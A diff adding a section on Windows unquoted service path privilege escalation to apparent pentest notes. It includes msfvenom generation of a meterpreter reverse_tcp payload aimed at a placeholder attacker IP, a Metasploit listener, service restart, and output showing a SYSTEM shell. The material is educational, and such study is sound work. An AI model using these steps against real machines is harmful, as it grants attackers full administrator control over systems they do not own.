@@ -34,3 +34,39 @@ net localgroup administrators
 Administrator 
 user 
 ```
+
+## Unqouted Service Paths 
+
+When a Windows service is created, it has a binary path (binPath / ImagePath) that tells Windows location of the service’s executable. If the path is not wrapped in quotes, Windows doesn’t know where the spaces end and tries different interpretations when starting the service
+
+**Victim** 
+
+```
+// Open command prompt
+sc qc unquotedsvc
+
+// Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes
+```
+
+**Attacker** 
+
+```
+// generating the payload 
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker_ip -f exe -o common.exe 
+
+// Now transfer the common.exe in the windows machine and Place common.exe in ‘C:\Program Files\Unquoted Path Service’ 
+
+// now start the metasploit framework 
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp 
+set lhost attacker_ip
+run 
+
+// now start the unquote services 
+sc start unquotedsvc
+
+// now we gained the reverse shell of administrator
+getuid 
+Server username: NT AUTHORITY\SYSTEM
+```
